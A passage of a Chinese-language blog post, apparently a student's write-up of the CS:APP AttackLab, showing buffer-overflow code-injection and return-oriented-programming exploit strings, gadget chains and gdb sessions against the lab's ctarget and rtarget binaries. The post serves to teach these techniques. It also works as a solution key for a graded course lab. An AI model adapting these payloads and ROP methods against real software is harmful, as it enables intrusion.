bovik</div><div class="line">	course	15213-f15</div><div class="line">	lab	attacklab</div><div class="line">	result	1:FAIL:0xffffffff:ctarget:3:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 A8 DC 61 55 00 00 00 00 BF 90 DC 61 55 48 83 C4 10 C3 00 00 00 00 00 00 FA 18 40 00 00 00 00 00</div></pre></td></tr></table></figure><br>糟糕，程序出错了，从Misfire: You called touch3(“”)中我们可以看出，%rdi指向的字符串是空字符串。这显然与我们的预期不符。我们的攻击代码理应没有任何问题。那么问题出在哪儿呢？</p>
<p>下面我们将攻击字符串导出成文件并且在gdb中进行调试，具体的操作和结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/A/target1&gt; cat solutions/ctarget/level3/level3-2.txt|./hex2raw &gt; weirdError</div><div class="line">user@BlackDragon ~/C/A/target1&gt; gdb ctarget                 </div><div class="line">GNU gdb (GDB) 7.12.1</div><div class="line">Copyright (C) 2017 Free Software Foundation, Inc.</div><div class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</div><div class="line">This is free software: you are free to change and redistribute it.</div><div class="line">There is NO WARRANTY, to the extent permitted by law.  Type <span class="string">"show copying"</span></div><div class="line">and <span class="string">"show warranty"</span> <span class="keyword">for</span> details.</div><div class="line">This GDB was configured as <span class="string">"x86_64-pc-linux-gnu"</span>.</div><div class="line">Type <span class="string">"show configuration"</span> <span class="keyword">for</span> configuration details.</div><div class="line">For bug reporting instructions, please see:</div><div class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</div><div class="line">Find the GDB manual and other documentation resources online at:</div><div class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</div><div class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">"help"</span>.</div><div class="line">Type <span class="string">"apropos word"</span> to search <span class="keyword">for</span> commands related to <span class="string">"word"</span>...</div><div class="line">Reading symbols from ctarget...done.</div><div class="line">(gdb) <span class="built_in">break</span> getbuf</div><div class="line">Breakpoint 1 at 0x4017a8: file buf.c, line 12.</div><div class="line">(gdb) run -i weirdError -q</div><div class="line">Starting program: /home/zhihaochen/CSAPPLabs/AttackLab/target1/ctarget -i weirdError -q</div><div class="line">Cookie: 0x59b997fa</div><div class="line"></div><div class="line">Breakpoint 1, getbuf () at buf.c:12</div><div class="line">12	buf.c: 没有那个文件或目录.</div><div class="line">(gdb) nexti 5</div><div class="line">0x00000000004017bd	16	<span class="keyword">in</span> buf.c</div><div class="line">(gdb) x /16b 0x5561dc90</div><div class="line">0x5561dc90:	53	57	98	57	57	55	102	97</div><div class="line">0x5561dc98:	0	0	0	0	0	0	0	0</div><div class="line">......After Some Steps......</div><div class="line">(gdb) disas</div><div class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> touch3:</div><div class="line">   0x00000000004018fa &lt;+0&gt;:	push   %rbx</div><div class="line">   0x00000000004018fb &lt;+1&gt;:	mov    %rdi,%rbx</div><div class="line">   0x00000000004018fe &lt;+4&gt;:	movl   <span class="variable">$0x3</span>,0x202bd4(%rip)        <span class="comment"># 0x6044dc &lt;vlevel&gt;</span></div><div class="line">   0x0000000000401908 &lt;+14&gt;:	mov    %rdi,%rsi</div><div class="line">   0x000000000040190b &lt;+17&gt;:	mov    0x202bd3(%rip),%edi        <span class="comment"># 0x6044e4 &lt;cookie&gt;</span></div><div class="line">=&gt; 0x0000000000401911 &lt;+23&gt;:	callq  0x40184c &lt;hexmatch&gt;</div><div class="line">   0x0000000000401916 &lt;+28&gt;:	<span class="built_in">test</span>   %eax,%eax</div><div class="line">   0x0000000000401918 &lt;+30&gt;:	je     0x40193d &lt;touch3+67&gt;</div><div class="line">   0x000000000040191a &lt;+32&gt;:	mov    %rbx,%rdx</div><div class="line">   0x000000000040191d &lt;+35&gt;:	mov    <span class="variable">$0x403138</span>,%esi</div><div class="line">   0x0000000000401922 &lt;+40&gt;:	mov    <span class="variable">$0x1</span>,%edi</div><div class="line">   0x0000000000401927 &lt;+45&gt;:	mov    <span class="variable">$0x0</span>,%eax</div><div class="line">   0x000000000040192c &lt;+50&gt;:	callq  0x400df0 &lt;__printf_chk@plt&gt;</div><div class="line">   0x0000000000401931 &lt;+55&gt;:	mov    <span class="variable">$0x3</span>,%edi</div><div class="line">   0x0000000000401936 &lt;+60&gt;:	callq  0x401c8d &lt;validate&gt;</div><div class="line">   0x000000000040193b &lt;+65&gt;:	jmp    0x40195e &lt;touch3+100&gt;</div><div class="line">   0x000000000040193d &lt;+67&gt;:	mov    %rbx,%rdx</div><div class="line">   0x0000000000401940 &lt;+70&gt;:	mov    <span class="variable">$0x403160</span>,%esi</div><div class="line">   0x0000000000401945 &lt;+75&gt;:	mov    <span class="variable">$0x1</span>,%edi</div><div class="line">   0x000000000040194a &lt;+80&gt;:	mov    <span class="variable">$0x0</span>,%eax</div><div class="line">(gdb) x /16b 0x5561dc90</div><div class="line">0x5561dc90:	53	57	98	57	57	55	102	97</div><div class="line">0x5561dc98:	0	0	0	0	0	0	0	0</div><div class="line">(gdb) nexti</div><div class="line">0x0000000000401916	73	<span class="keyword">in</span> visible.c</div><div class="line">(gdb) x /16b 0x5561dc90</div><div class="line">0x5561dc90:	0	-98	119	-23	120	13	-32	-89</div><div class="line">0x5561dc98:	-112	-36	97	85	0	0	0	0</div></pre></td></tr></table></figure><br>我们可以注意到，在函数touch3调用函数hexmatch的前后，0x5561dc90指向的内存并不是我们一开始注入的cookie的字符串表示，而是被填充了其他的数据。这是由于调用新的函数（hexmatch以及hexmatch调用的函数）使得栈帧继续向下增长，从而覆盖了原先我们注入的数据的原因。</p>
<p>我们可以在gdb中实际的运行一下ctarget来得出执行hexmatch函数到底会覆盖多少栈空间，然后根据结果重写我们的攻击代码。<br>但是我在这里采用了另外一种方法是直接将cookie的字符串表示写到攻击代码的最后，这样，这段字符串将会处于相对的高地址，由于栈的增长方向是从高地址到低地址，这样，注入的字符串将绝对不会因函数调用而被覆盖。</p>
<p>最终，我们的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30 /* 前40个字节 */</div><div class="line">a8 dc 61 55 00 00 00 00 /* 返回地址 指向下8个字节 */</div><div class="line">bf c0 dc 61 55 48 83 c4</div><div class="line">10 c3 00 00 00 00 00 00 /* 攻击代码 其中将%rdi指向字符串的首地址（栈的高地址）*/</div><div class="line">fa 18 40 00 00 00 00 00 /* 返回地址 指向函数touch3 */</div><div class="line">35 39 62 39 39 37 66 61 /* cookie的字符串表示 共9个字节（包括<span class="string">'/0'</span>） */</div><div class="line">00</div></pre></td></tr></table></figure><br>用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/A/target1&gt; cat solutions/ctarget/level3/level3.txt|./hex2raw|./ctarget -q</div><div class="line">Cookie: 0x59b997fa</div><div class="line">Type string:Touch3!: You called touch3(<span class="string">"59b997fa"</span>)</div><div class="line">Valid solution <span class="keyword">for</span> level 3 with target ctarget</div><div class="line">PASS: Would have posted the following:</div><div class="line">	user id	bovik</div><div class="line">	course	15213-f15</div><div class="line">	lab	attacklab</div><div class="line">	result	1:PASS:0xffffffff:ctarget:3:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 A8 DC 61 55 00 00 00 00 BF C0 DC 61 55 48 83 C4 10 C3 00 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00</div></pre></td></tr></table></figure><br>本阶段完成。</p>
<h3 id="第二部分-返回导向编程（Return-Oriented-Programming）攻击"><a href="#第二部分-返回导向编程（Return-Oriented-Programming）攻击" class="headerlink" title="第二部分 返回导向编程（Return-Oriented Programming）攻击"></a>第二部分 返回导向编程（Return-Oriented Programming）攻击</h3><p>为了对抗缓冲区溢出攻击，现代编译器和操作系统采用了很多机制。第二部分的目标文件rtarget就采用了以下两种技术：</p>
<ul>
<li>栈随机化技术，每一次运行程序时，栈的起始位置都是不固定的，几乎不可能确定你攻击代码在栈上的位置。</li>
<li>禁止执行栈上的代码，所以当你尝试将PC指向栈段的时候，程序只能因Segmentation Fault而退出。</li>
</ul>
<p>下面我们引入返回导向编程（Return-Oriented Programming）技术来实现在以上两种限制情况下执行代码。</p>
<p>C语言程序是由若干的函数组成的，每一个函数都以ret结束，下面我们给出一个函数，如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">setval_210</span><span class="params">(<span class="keyword">unsigned</span> *p)</span></span></div><div class="line">&#123;</div><div class="line">	*p = <span class="number">3347663060U</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><br>以及这个函数的反汇编结果，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">0000000000400f15 &lt;setval_210&gt;:</div><div class="line">400f15:		c7 <span class="number">07</span> d4 <span class="number">48</span> <span class="number">89</span> c7	movl	<span class="number">$0</span>xc78948d4,(%rdi)</div><div class="line">400f1b:		c3					retq</div></pre></td></tr></table></figure></p>
<p>尽管栈随机化以及禁止在栈段执行代码，但是通过缓冲区溢出攻击，我们仍然可以覆盖返回地址并且让PC跳转至代码段的相应位置。例如让getbuf返回后跳转至0x400f15，尽管这看起来并没有什么意义，因为程序的代码和我们攻击的代码的逻辑是不同的，攻击代码和程序已有代码相同的可能性几乎是0。</p>
<p>现在，让我们换一个思路，如果让getbuf返回后跳转到0x400f18，会怎么样呢？</p>
<p>从0x400f18开始的三个字节48 89 c7代表的是movq %rax, %rdi，然后紧跟的c3代表的是ret。在攻击中，这段代码就比movl $0xc78948d4,(%rdi) ret这样的代码更有意义。并且当这段代码执行完毕，ret又迫使程序跳转到下一个返回地址指向的地方。</p>
<p>现在我们可以利用程序本身的代码，构造出一组由不同的返回地址组成的攻击代码，每一个返回地址都指向了一个函数的最末尾的若干字节，由ret结尾。这样，程序就会按照我们设计的顺序依次执行这些代码片段，以达到修改程序行为的结果，这就是返回导向编程。这些代码片段被称作gadget，而这些gadgets共同组成了一个gadget farm。</p>
<h4 id="等级2-1"><a href="#等级2-1" class="headerlink" title="等级2"></a>等级2</h4><p>在阶段4中，我们将重复阶段2的攻击，只是这一次目标文件为rtarget。为了简化期间，在本次实验中，你仅能从gadget farm中利用movq，popq，ret，nop这四种类型的指令以及x86_64的前8个寄存器（%rax-%rdi）的gadget去构造答案。并且在阶段4中，你只能使用farm.c中start_farm()和mid_farm()之间的gadget来实现攻击。</p>
<p>当一个gadget用到了popq指令，它将会从栈中pop数据，因此，你的攻击代码将会同时包括gadget地址以及数据。</p>
<p>阶段4的思路很简单，我们只要首先从栈中将cookie的8位数字pop到一个寄存器中，再使用mov指令将该寄存器的值送入%rdi中，或者更加直接，将cookie从栈中pop至%rdi中，最后再将返回地址设置为touch2即可。具体要看gadget farm中都提供了哪些gadgets。</p>
<p>我们首先观察gadget_farm中的相关gadgets，并决定其是否可以用作攻击。根据上述的思路，我们可以得到两个gadget set_val426及getval_280，它们的反汇编代码如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">00000000004019c3 &lt;setval_426&gt;:</div><div class="line">  4019c3:       c7 <span class="number">07</span> <span class="number">48</span> <span class="number">89</span> c7 <span class="number">90</span>       movl   <span class="number">$0</span>x90c78948,(%rdi)</div><div class="line">  4019c9:       c3						retq  </div><div class="line"></div><div class="line">00000000004019ca &lt;getval_280&gt;:</div><div class="line">  4019ca:       b8 <span class="number">29</span> <span class="number">58</span> <span class="number">90</span> c3          <span class="keyword">mov</span>    <span class="number">$0</span>xc3905829,%eax</div><div class="line">  4019cf:       c3                      retq   </div></pre></td></tr></table></figure><br>setval_426中的48 89 c7 90 c3可以被解释为mov %rax,%rdi nop ret，而getval_280中的58 90 c3可以被解释为pop %rax nop ret。<br>将这两个gadget结合，即可以得到阶段4的结果，如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30 /* 前40个字节 */</div><div class="line">cc 19 40 00 00 00 00 00 /* pop %rax */</div><div class="line">fa 97 b9 59 00 00 00 00 /* cookie */</div><div class="line">c5 19 40 00 00 00 00 00 /* mov %rax,%rdi */</div><div class="line">ec 17 40 00 00 00 00 00 /* touch2 */</div></pre></td></tr></table></figure><br>用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/A/target1&gt; cat solutions/rtarget/level2/level2.txt|./hex2raw|./rtarget -q</div><div class="line">Cookie: 0x59b997fa</div><div class="line">Type string:Touch2!: You called touch2(0x59b997fa)</div><div class="line">Valid solution <span class="keyword">for</span> level 2 with target rtarget</div><div class="line">PASS: Would have posted the following:</div><div class="line">	user id	bovik</div><div class="line">	course	15213-f15</div><div class="line">	lab	attacklab</div><div class="line">	result	1:PASS:0xffffffff:rtarget:2:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00</div></pre></td></tr></table></figure><br>本阶段完成。</p>
<h4 id="等级3-1"><a href="#等级3-1" class="headerlink" title="等级3"></a>等级3</h4><p>在阶段5中，我们将在rtarget中重复阶段3的攻击，即将目标字符串的首地址作为参数传递给函数touch3。这是所有阶段中最难的一个阶段。</p>
<p>首先，考虑到代码段部分以及栈段部分的地址的高4字节都是0，以及x86下任何以32位寄存器作为目标寄存器的指令都会将该寄存器的高4字节置0，我们同样可以使用movl替代movq。</p>
<p>在本阶段中，我们显然是需要将cookie的字符串表示存入栈段的，这个阶段的核心问题是如何定位该字符串的首地址，在栈地址随机的情况下，这是很难的。</p>
<p>首先想到的是利用mov指令将%rsp的值送入另一个寄存器，但是在执行这样的gadget时，寄存器rsp指向的是下一个gadget的返回地址，而不是字符串的首地址，而如果让其指向字符串的首地址，那么又无法在最后返回到函数touch3。</p>
<p>我在做这个实验的时候，在这里卡了很久。最后才注意到在gadget farm中有一个叫做add_xy的函数，这个函数的功能是将%rdi与%rsi相加并保存至%rax，豁然开朗。做题目（进行攻击）的时候还是不能太死板，一定要充分利用目标程序本身提供的代码，一味地按照固有的套路做有时只会浪费时间和精力。</p>
<p>整个阶段5的思路如下，首先将rsp存入某个寄存器之中，然后再将一个特定的常量pop至另一个寄存器之中，最后将这两个值分别存入%rsi和%rdi，调用add_xy将其相加得到字符串的首地址，并将结果%rax存入%rdi之中，最后再调用函数touch3即可。</p>
<p>受制于gadget的种类，我们可能会用到多个gadget做中转。最终的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30 /* 前40个字节 */</div><div class="line">06 1a 40 00 00 00 00 00 /* mov %rsp,%rax */</div><div class="line">a2 19 40 00 00 00 00 00 /* mov %rax,%rdi &lt;- %rax指向的地址*/</div><div class="line">ab 19 40 00 00 00 00 00 /* pop %rax */</div><div class="line">48 00 00 00 00 00 00 00 /* offset constant*/</div><div class="line">dd 19 40 00 00 00 00 00 /* mov %eax,%edx */</div><div class="line">34 1a 40 00 00 00 00 00 /* mov %edx,%ecx */</div><div class="line">13 1a 40 00 00 00 00 00 /* mov %ecx,%esi */</div><div class="line">d6 19 40 00 00 00 00 00 /* add_xy */</div><div class="line">a2 19 40 00 00 00 00 00 /* mov %rax,%rdi */</div><div class="line">fa 18 40 00 00 00 00 00 /* touch3 */</div><div class="line">35 39 62 39 39 37 66 61 /* cookie的字符串表示 与前面保存的rsp总共差了9条语句 故常量为0x48*/</div><div class="line">00</div></pre></td></tr></table></figure><br>用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/A/target1&gt; cat solutions/rtarget/level3/level3.txt|./hex2raw|./rtarget -q                </div><div class="line">Cookie: 0x59b997fa</div><div class="line">Type string:Touch3!: You called touch3(<span class="string">"59b997fa"</span>)</div><div class="line">Valid solution <span class="keyword">for</span> level 3 with target rtarget</div><div class="line">PASS: Would have posted the following:</div><div class="line">	user id	bovik</div><div class="line">	course	15213-f15</div><div class="line">	lab	attacklab</div><div class="line">	result	1:PASS:0xffffffff:rtarget:3:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00</div></pre></td></tr></table></figure><br>本阶段完成。</p>
<blockquote>
<p>注意，在第二部分中，可能使用不同的Gadget去实现相同的攻击效果，答案仅供参考，但并不是唯一的。</p>
</blockquote>
<p>至此，整个实验完成。</p>
<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>相比与BombLab来说，整个AttackLab总体比较简单，主要需要自行阅读讲义中的材料学习相关的攻击方式并将其运用，考虑到讲义中给出的提示，除了阶段5以外整体不是很难。</p>
<p>在这次实验中，主要的两个问题以及收获：</p>
<ul>
<li>字节序的问题，需要对栈的增长方向以及小端法的字节序加以理解。</li>
<li>ROP攻击要充分利用程序本身，而不是循规蹈矩地盲目寻找Gadgets，这样只会在阶段五卡住。</li>
</ul>

            
        </div>
    </div>
    <div id="post-footer" class="post-footer main-content-wrap">
        
            <div class="post-footer-tags">
                <span class="text-color-light text-small">标签</span><br/>
                
    <a class="tag tag--primary tag--small t-link" href="/tags/实验/">实验</a> <a class="tag tag--primary tag--small t-link" href="/tags/计算机系统/">计算机系统</a>

            </div>
        
        
            <div class="post-actions-wrap">
    <nav>
        <ul class="post-actions post-action-nav">
            <li class="post-action">
                
                    <a class="post-action-btn btn btn--default tooltip--top" href="/2017/05/12/迁移说明/"  data-tooltip="迁移说明">
                
                    <i class="fa fa-angle-left"></i>
                    <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
                </a>
            </li>
            <li class="post-action">
                
                    <a class="post-action-btn btn btn--default tooltip--top" href="/2017/04/18/深入理解计算机系统BombLab实验报告/" data-tooltip="深入理解计算机系统BombLab实验报告">
                
                    <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
                    <i class="fa fa-angle-right"></i>
                </a>
            </li>
        </ul>
    </nav>
    <ul class="post-actions post-action-share">
        <li class="post-action hide-lg hide-md hide-sm">
            <a class="post-action-btn btn btn--default btn-open-shareoptions"  href="#btn-open-shareoptions">
                <i class="fa fa-share-alt"></i>
            </a>
        </li>
        
            
            
            <li class="post-action hide-xs">
                <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://blog.duskdragon.com/2017/05/09/深入理解计算机系统AttackLab实验报告/">
                    <i class="fa fa-facebook-official"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=http://blog.duskdragon.com/2017/05/09/深入理解计算机系统AttackLab实验报告/">
                    <i class="fa fa-twitter"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=http://blog.duskdragon.com/2017/05/09/深入理解计算机系统AttackLab实验报告/">
                    <i class="fa fa-google-plus"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a class="post-action-btn btn btn--default" target="new" href="http://service.weibo.com/share/share.php?&amp;title=http://blog.duskdragon.com/2017/05/09/深入理解计算机系统AttackLab实验报告/">
                    <i class="fa fa-weibo"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a class="post-action-btn btn btn--default" target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=http://blog.duskdragon.com/2017/05/09/深入理解计算机系统AttackLab实验报告/&amp;title=深入理解计算机系统AttackLab实验报告">
                    <i class="fa fa-qq"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a class="post-action-btn btn btn--default" target="new" href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://blog.duskdragon.com/2017/05/09/深入理解计算机系统AttackLab实验报告/">
                    <i class="fa fa-star"></i>
                </a>
            </li>
        
        
        <li class="post-action">
            
                <a class="post-action-btn btn btn--default" href="#">
            
                <i class="fa fa-list"></i>
            </a>
        </li>
    </ul>
</div>


        
        
            
        
    </div>
</article>



                <footer id="footer" class="main-content-wrap">
    <span class="copyrights">
        Copyrights &copy; 2017 BlackDragon. All Rights Reserved.
    </span>
</footer>

            </div>
            
                <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
                    <div class="post-actions-wrap">
    <nav>
        <ul class="post-actions post-action-nav">
            <li class="post-action">
                
                    <a class="post-action-btn btn btn--default tooltip--top" href="/2017/05/12/迁移说明/"  data-tooltip="迁移说明">
                
                    <i class="fa fa-angle-left"></i>
                    <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
                </a>
            </li>
            <li class="post-action">
                
                    <a class="post-action-btn btn btn--default tooltip--top" href="/2017/04/18/深入理解计算机系统BombLab实验报告/" data-tooltip="深入理解计算机系统BombLab实验报告">
                
                    <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
                    <i class="fa fa-angle-right"></i>
                </a>
            </li>
        </ul>
    </nav>
    <ul class="post-actions post-action-share">
        <li class="post-action hide-lg hide-md hide-sm">
            <a class="post-action-btn btn btn--default btn-open-shareoptions"  href="#btn-open-shareoptions">
                <i class="fa fa-share-alt"></i>
            </a>
        </li>
        
            
            
            <li class="post-action hide-xs">
                <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://blog.duskdragon.com/2017/05/09/深入理解计算机系统AttackLab实验报告/">
                    <i class="fa fa-facebook-official"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=http://blog.duskdragon.com/2017/05/09/深入理解计算机系统AttackLab实验报告/">
                    <i class="fa fa-twitter"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=http://blog.duskdragon.com/2017/05/09/深入理解计算机系统AttackLab实验报告/">
                    <i class="fa fa-google-plus"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a class="post-action-btn btn btn--default" target="new" href="http://service.weibo.com/share/share.php?&amp;title=http://blog.duskdragon.com/2017/05/09/深入理解计算机系统AttackLab实验报告/">
                    <i class="fa fa-weibo"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a class="post-action-btn btn btn--default" target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=http://blog.duskdragon.com/2017/05/09/深入理解计算机系统AttackLab实验报告/&amp;title=深入理解计算机系统AttackLab实验报告">
                    <i class="fa fa-qq"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a class="post-action-btn btn btn--default" target="new" href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://blog.duskdragon.com/2017/05/09/深入理解计算机系统AttackLab实验报告/">
                    <i class="fa fa-star"></i>
                </a>
            </li>
        
        
        <li class="post-action">
            
                <a class="post-action-btn btn btn--default" href="#">
            
                <i class="fa fa-list"></i>
            </a>
        </li>
    </ul>
</div>


                </div>
                <div id="share-options-bar" class="share-options-bar" data-behavior="4">
    <i id="btn-close-shareoptions" class="fa fa-close"></i>
    <ul class="share-options">
        
            
            
            <li class="share-option">
                <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://blog.duskdragon.com/2017/05/09/深入理解计算机系统AttackLab实验报告/">
                    <i class="fa fa-facebook-official"></i><span>分享到 Facebook</span>
                </a>
            </li>
        
            
            
            <li class="share-option">
                <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=http://blog.duskdragon.com/2017/05/09/深入理解计算机系统AttackLab实验报告/">
                    <i class="fa fa-twitter"></i><span>分享到 Twitter</span>
                </a>
            </li>
        
            
            
            <li class="share-option">
                <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=http://blog.duskdragon.com/2017/05/09/深入理解计算机系统AttackLab实验报告/">
                    <i class="fa fa-google-plus"></i><span>分享到 Google+</span>
                </a>
            </li>
        
            
            
            <li class="share-option">
                <a class="share-option-btn" target="new" href="http://service.weibo.com/share/share.php?&amp;title=http://blog.duskdragon.com/2017/05/09/深入理解计算机系统AttackLab实验报告/">
                    <i class="fa fa-weibo"></i><span>分享到 Weibo</span>
                </a>
            </li>
        
            
            
            <li class="share-option">
                <a class="share-option-btn" target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=http://blog.duskdragon.com/2017/05/09/深入理解计算机系统AttackLab实验报告/&amp;title=深入理解计算机系统AttackLab实验报告">
                    <i class="fa fa-qq"></i><span>分享到 QQ</span>
                </a>
            </li>
        
            
            
            <li class="share-option">
                <a class="share-option-btn" target="new" href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://blog.duskdragon.com/2017/05/09/深入理解计算机系统AttackLab实验报告/">
                    <i class="fa fa-star"></i><span>分享到 Qzone</span>
                </a>
            </li>
        
    </ul>
</div>

            
        </div>
        


    
        
    

<div id="about">
    <div id="about-card">
        <div id="about-btn-close">
            <i class="fa fa-remove"></i>
        </div>
        
            <img id="about-card-picture" src="/assets/images/avatar.jpg" alt="作者的图片"/>
        
            <h4 id="about-card-name">BlackDragon</h4>
        
            <div id="about-card-bio"><p>码龙黑曜 - iOS开发者/计算机科学/兽人控</p>
</div>
        
        
            <div id="about-card-job">
                <i class="fa fa-briefcase"></i>
                <br/>
                <p>本科在读</p>

            </div>
        
        
            <div id="about-card-location">
                <i class="fa fa-map-marker"></i>
                <br/>
